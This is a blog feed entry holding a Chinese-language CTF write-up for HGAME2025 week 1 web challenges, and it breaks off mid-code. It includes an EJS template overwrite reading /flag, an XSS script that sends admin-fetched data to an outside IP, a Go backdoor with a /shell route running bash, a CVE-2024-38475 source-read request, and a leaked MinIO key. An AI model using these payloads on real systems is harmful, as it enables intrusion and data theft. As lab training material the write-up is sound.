<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p0l1st&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-02-11T15:53:51.476Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>p0l1st</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HGAME2025 WEEK1 Web Writeup</title>
    <link href="http://example.com/2025/02/10/HGAME2025-WEEK1-Web-Writeup/"/>
    <id>http://example.com/2025/02/10/HGAME2025-WEEK1-Web-Writeup/</id>
    <published>2025-02-10T05:28:16.000Z</published>
    <updated>2025-02-11T15:53:51.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h1><p>index.js</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330109.png" alt="image-20250204203705984"></p><p>base64+栅栏2解密</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330146.png" alt="image-20250204203827139" style="zoom:50%;"><p>hgame{u_4re_pacman_m4ster}</p><h1 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h1><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>首先看到<code>const multer = require(&#39;multer&#39;)</code>使用了multer然后有任意文件上传，并且rename路由可以重命名上传的文件，</p><blockquote><p>Express会通过view&#x2F;mortis.ejs渲染mortis视图</p></blockquote><p>那么就可以上传一个ejs文件重命名为..&#x2F;view&#x2F;mortis.ejs</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= process.env.FLAG || require(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101332143.png" alt="image-20250210133220036"></p><p>再访问主页面</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101331952.png" alt="image-20250210133122592"></p><p>hgame{aVe_MuJ1cA-Has-BROK3n_UP-But-w3_h@v3-uMlTakif}</p><h1 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h1><p>弱口令，密码是888888</p><p>进去之后有个留言板</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330017.png" alt="image-20250204225011231" style="zoom:50%;"><p>存在xss并且flag路由只能admin访问,admin路由可以查看留言</p><p>那么让admin访问flag就行，把数据外带出来</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> flagData = xmlhttp.<span class="property">responseText</span>;</span><br><span class="line">        <span class="keyword">var</span> flag1 = <span class="title function_">btoa</span>(flagData);</span><br><span class="line">        <span class="keyword">var</span> remoteServerUrl = <span class="string">&#x27;http://60.205.1.86:9000/&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> xmlhttp2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xmlhttp2.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, remoteServerUrl, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp2.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xmlhttp2.<span class="title function_">send</span>(<span class="string">&quot;content=&quot;</span> + <span class="built_in">encodeURIComponent</span>(flag1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330123.png" alt="image-20250206214131540"></p><p>hgame{W0w_y0u_5r4_9o0d_4t_xss}</p><h1 id="Level-25-双面人派对"><a href="#Level-25-双面人派对" class="headerlink" title="Level 25 双面人派对"></a>Level 25 双面人派对</h1><p>main文件直接执行，可以看到是启了一个http服务</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330228.png" alt="image-20250209120914776"></p><p>然后先对main文件upx -d脱壳，再用ida打开</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330161.png" alt="image-20250209191807064"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101333759.png" alt="image-20250210133305397"></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">minio:</span><br><span class="line">  endpoint: &quot;127.0.0.1:9000&quot;</span><br><span class="line">  access_key: &quot;minio_admin&quot;</span><br><span class="line">  secret_key: &quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span><br><span class="line">  bucket: &quot;prodbucket&quot;</span><br><span class="line">  key: &quot;update&quot;</span><br></pre></td></tr></table></figure></div><p>问gpt，这是MinIO对象存储服务</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330170.png" alt="image-20250209130016207" style="zoom:50%;"><p>连接服务</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mc alias set test http://node1.hgame.vidar.club:30574/ minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330221.png" alt="image-20250209134636965"></p><p>源码在<code>hints</code>里，并且发现prodbucket里面有个<code>update</code></p><p>结合文章<a class="link" href="https://baimeow.cn/posts/ctf/d3go">https://baimeow.cn/posts/ctf/d3go <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330114.png" alt="image-20250209134838177" style="zoom:50%;"><p>直接在main.go里面增加一个rce路由编译成<code>update</code>,再上传到prodbucket覆盖原来的<code>update</code>就行</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line"><span class="string">&quot;src/conf&quot;</span></span><br><span class="line"><span class="string">&quot;src/fetch&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fetcher := &amp;fetch.MinioFetcher&#123;</span><br><span class="line">Bucket:    conf.MinioBucket,</span><br><span class="line">Key:       conf.MinioKey,</span><br><span class="line">Endpoint:  conf.MinioEndpoint,</span><br><span class="line">AccessKey: conf.MinioAccessKey,</span><br><span class="line">SecretKey: conf.MinioSecretKey,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">overseer.Run(overseer.Config&#123;</span><br><span class="line">Program: program,</span><br><span class="line">Fetcher: fetcher,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">program</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">g := gin.Default()</span><br><span class="line">g.StaticFS(<span class="string">&quot;/&quot;</span>, gin.Dir(<span class="string">&quot;.&quot;</span>, <span class="literal">true</span>))</span><br><span class="line"></span><br><span class="line">g.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := c.PostForm(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> cmd == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">400</span>, <span class="string">&quot;No command provided&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd).CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;Error executing command: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">err := g.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Failed to start server:&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330137.png" alt="image-20250209150133237" style="zoom:50%;"><p>flag{y0u-5AId-RlGHT_But-You_5H0u1d-pI4y-gEn5hiN-IMp@CT0}</p><h1 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h1><p>robots.txt</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502062137977.png" alt="image-20250206213758771" style="zoom:50%;"><p>app.conf</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">Options Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure></div><p>cve-2024-38475,构造请求获取源码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /admin//usr/local/apache2/app/app.py%3f HTTP/1.1</span><br><span class="line">Host: node1.hgame.vidar.club:32372</span><br><span class="line">User-Agent: L1nk/</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502061716289.png" alt="image-20250206171648135"></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        message = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        status = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(message)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">        show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line">        <span class="keyword">return</span> render_template_string(show)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div><p><code>/read</code>路由会读取留言的内容，看到<code>render_template_string</code>就知道有SSTI，但是过滤了{，可以条件竞争</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 